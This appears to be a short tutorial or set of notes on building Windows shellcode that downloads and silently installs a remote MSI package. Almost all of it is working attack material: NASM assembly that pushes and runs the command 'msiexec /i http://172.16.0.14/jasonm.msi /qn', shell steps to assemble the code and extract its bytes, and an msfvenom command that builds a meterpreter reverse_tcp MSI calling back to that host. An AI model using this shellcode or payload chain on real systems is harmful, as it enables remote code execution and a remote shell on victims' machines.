

https://web.archive.org/web/20120503030935/http://projectshellcode.com/?q=node/12

1. I followed above first two tutorials (1. Intro tools & setup 2. My first shellcode.) to output shellcode, alternatively follow shellcode developer's write-
up....I'm sure it works!

Shellcode Developer: Kartik Durg

https://iamroot.blog/2019/01/28/windows-shellcode-download-and-execute-payload-using-msiexec/

2. The following asm does this: #

3. msiexec /i http://172.16.0.14/jasonm.msi /qn

4. Need to Determine LoadLibrary, ExitProcess & System via Arwin

```
------------assembly starts---------------

BITS 32
global _start
_start:
			
mov ebx, 0x777fde35      		;Address of function LoadLibraryA (win7)
call ebx
mov ebp, eax             		;msvcrt.dll is saved in ebp
xor eax, eax
PUSH eax
PUSH 0x6e712f20
PUSH 0x69736d2e
PUSH 0x6d6e6f73
PUSH 0x616a2f34
PUSH 0x312e302e
PUSH 0x36312e32
PUSH 0x37312f2f
PUSH 0x3a707474
PUSH 0x6820692f
PUSH 0x20636578
PUSH 0x6569736d
MOV EDI,ESP
PUSH EDI
MOV EAX, 0x768db177			;calling the system()
CALL EAX
xor eax, eax
push eax
mov eax, 0x7780be5a     		; ExitProcess
call eax

--------------assembly end----------------------------------
```
5. Save as msi.asm

6. Using Cygwin

7.xvz@xvz-PC ~
$ nasm -f win32 msi.asm -o msi.bin

8.Get rid of null bytes

9.xvz@xvz-PC ~
$ for i in $(objdump -D msi.o | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo

10.Add to script

11.Create MSI
msfvenom -p windows/meterpreter/reverse_tcp LPORT=4444 LHOST=172.16.0.14 -f msi -o jasonm.msi

Start web-server port 80
